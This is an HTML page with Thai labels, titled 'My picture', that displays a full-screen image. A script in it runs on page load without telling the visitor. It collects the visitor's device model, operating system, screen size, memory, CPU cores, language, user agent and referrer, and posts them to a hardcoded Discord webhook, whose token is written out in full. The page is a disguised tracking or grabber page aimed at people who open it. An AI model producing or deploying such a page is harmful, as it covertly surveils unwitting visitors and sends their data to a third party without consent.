<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>รูปของผม</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background: #000;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <img src="mokey.jpeg" alt="รูปของผม">

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1518843570419794011/Xr5QP4axaLbeyCBsKCJ6ExudFmYoScrX3fir3dIrzIxpFeEBkGhUphfqFBTVkEfPo6kM";

        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceModel = "Unknown";
            let brand = "Unknown";
            let os = "Unknown";

            // iOS Devices
            if (/iPhone/.test(ua)) {
                brand = "Apple";
                deviceModel = "iPhone";
                const iosVersion = ua.match(/iPhone OS (\d+_\d+)/);
                if (iosVersion) deviceModel += " (iOS " + iosVersion[1].replace('_', '.') + ")";
            } 
            else if (/iPad/.test(ua)) {
                brand = "Apple";
                deviceModel = "iPad";
            } 
            // Android Devices - ตรวจจับรุ่นยอดนิยม
            else if (/Android/.test(ua)) {
                brand = "Android";
                const androidModel = ua.match(/(SM-[A-Z0-9]+|Pixel [0-9]+|Galaxy [A-Z0-9]+|Redmi|Mi|POCO|OnePlus|Oppo|Vivo|Realme|Honor|Motorola|Nexus)/i);
                
                if (androidModel) {
                    deviceModel = androidModel[0];
                } else {
                    // พยายามดึงชื่อรุ่นทั่วไปจาก Build
                    const buildMatch = ua.match(/Build\/([A-Z0-9]+)/i);
                    deviceModel = buildMatch ? "Android " + buildMatch[1] : "Android Device";
                }
            } 
            // Windows / Desktop / Laptop
            else if (/Windows/.test(ua)) {
                deviceModel = "Windows PC/Laptop";
                const winVersion = ua.match(/Windows NT (\d+\.\d+)/);
                if (winVersion) os = "Windows " + winVersion[1];
            } 
            else if (/Macintosh/.test(ua)) {
                deviceModel = "Mac (Apple)";
            } 
            else if (/Linux/.test(ua)) {
                deviceModel = "Linux Device";
            }

            return {
                deviceModel: deviceModel,
                brand: brand,
                fullUA: ua.substring(0, 500),
                platform: navigator.platform,
                screen: `${screen.width}×${screen.height} (${screen.pixelDepth}bit)`,
                touch: 'ontouchstart' in window ? "มือถือ/แท็บเล็ต" : "Desktop",
                language: navigator.language,
                memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Unknown"
            };
        }

        const info = getDetailedDeviceInfo();

        const logData = {
            content: "**🔔 มีคนเปิดหน้าเว็บ**",
            embeds: [{
                title: "📱 ข้อมูลอุปกรณ์ผู้เข้าเว็บ",
                color: 0x00ff00,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "เวลา", value: new Date().toLocaleString('th-TH'), inline: true },
                    { name: "แบรนด์ / รุ่น", value: info.brand + " — " + info.deviceModel, inline: false },
                    { name: "หน้าจอ", value: info.screen, inline: true },
                    { name: "ระบบ", value: info.platform, inline: true },
                    { name: "ประเภท", value: info.touch, inline: true },
                    { name: "RAM / Cores", value: info.memory + " / " + info.cores, inline: true },
                    { name: "ภาษา", value: info.language, inline: true },
                    { name: "User-Agent", value: "```" + info.fullUA + "```", inline: false },
                    { name: "Referrer", value: document.referrer || "ตรง", inline: false }
                ]
            }]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(logData)
        }).catch(err => console.error("Webhook error:", err));
    </script>
</body>
</html>
